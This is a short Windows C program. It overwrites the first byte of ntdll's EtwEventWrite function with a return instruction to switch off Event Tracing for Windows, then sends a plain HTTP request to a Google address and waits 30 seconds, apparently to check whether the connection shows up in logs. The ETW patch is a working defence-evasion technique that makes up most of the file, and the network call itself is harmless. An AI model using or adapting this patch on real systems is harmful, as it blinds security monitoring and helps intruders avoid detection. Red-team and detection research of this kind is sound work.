#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdio.h>

#pragma comment(lib, "Ws2_32.lib")

void PatchEtw() {
    void* p = GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite");
    DWORD old;
    VirtualProtect(p, 1, PAGE_EXECUTE_READWRITE, &old);
    *(BYTE*)p = 0xC3; // ret
    VirtualProtect(p, 1, old, &old);
    printf("[+] EtwEventWrite patched\n");
}

int main() {
    PatchEtw();

    WSADATA wsa;
    WSAStartup(MAKEWORD(2,2), &wsa);

    SOCKET s = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_port = htons(80);
    inet_pton(AF_INET, "142.250.190.68", &server.sin_addr); // google.com

    printf("[*] Connecting to google.com:80\n");
    connect(s, (struct sockaddr*)&server, sizeof(server));

    send(s, "GET / HTTP/1.1\r\nHost: google.com\r\n\r\n", 39, 0);
    closesocket(s);

    WSACleanup();
    Sleep(30000); // time to check logs
    return 0;
}
